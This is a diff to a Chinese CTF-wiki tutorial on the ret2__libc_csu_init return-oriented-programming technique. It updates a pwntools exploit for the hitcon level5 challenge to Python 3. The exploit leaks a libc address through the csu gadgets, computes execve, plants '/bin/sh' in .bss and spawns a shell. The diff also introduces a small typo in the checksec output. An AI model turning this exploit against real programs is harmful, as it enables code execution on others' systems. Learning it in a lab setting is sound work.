@@ -61,14 +61,14 @@
 
 ### 示例
 
-这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 [level5](https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5) 为例进行介绍。首先检查程序的安全保护
+这里我们以hitcon [level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2__libc_csu_init/hitcon-level5) 为例进行介绍。首先检查程序的安全保护
 
 ```shell
-➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5
+➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5    
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
-    NX:       NX enabled
+    NX:       NX enabledd
     PIE:      No PIE (0x400000)
 ```
 
@@ -100,10 +100,8 @@ exp 如下
 
 ```python
 from pwn import *
-from LibcSearcher import LibcSearcher
 
-#context.log_level = 'debug'
-
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
 level5 = ELF('./level5')
 sh = process('./level5')
 
@@ -113,8 +111,7 @@ main_addr = level5.symbols['main']
 bss_base = level5.bss()
 csu_front_addr = 0x0000000000400600
 csu_end_addr = 0x000000000040061A
-fakeebp = 'b' * 8
-
+fakeebp = b'b' * 8
 
 def csu(rbx, rbp, r12, r13, r14, r15, last):
     # pop rbx,rbp,r12,r13,r14,r15
@@ -124,36 +121,32 @@ def csu(rbx, rbp, r12, r13, r14, r15, last):
     # rdi=edi=r15d
     # rsi=r14
     # rdx=r13
-    payload = 'a' * 0x80 + fakeebp
+    payload = b'a' * 0x80 + fakeebp
     payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
         r13) + p64(r14) + p64(r15)
     payload += p64(csu_front_addr)
-    payload += 'a' * 0x38
+    payload += b'a' * 0x38
     payload += p64(last)
     sh.send(payload)
-    sleep(1)
+    time.sleep(1)
 
-
-sh.recvuntil('Hello, World\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
+sh.recvuntil(b'Hello, World\n')
 csu(0, 1, write_got, 8, write_got, 1, main_addr)
 
 write_addr = u64(sh.recv(8))
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-execve_addr = libc_base + libc.dump('execve')
-log.success('execve_addr ' + hex(execve_addr))
-##gdb.attach(sh)
+log.info(f"Leaked write address: {hex(write_addr)}")
 
-## read(0,bss_base,16)
-## read execve_addr and /bin/sh\x00
-sh.recvuntil('Hello, World\n')
+libc_base = write_addr - libc.symbols['write']
+log.success(f"Libc base address: {hex(libc_base)}")
+
+execve_addr = libc_base + libc.symbols['execve']
+log.success(f"Execve address: {hex(execve_addr)}")
+
+sh.recvuntil(b'Hello, World\n')
 csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + '/bin/sh\x00')
+sh.send(p64(execve_addr) + b'/bin/sh\x00')
 
-sh.recvuntil('Hello, World\n')
-## execve(bss_base+8)
+sh.recvuntil(b'Hello, World\n')
 csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
 sh.interactive()
 ```
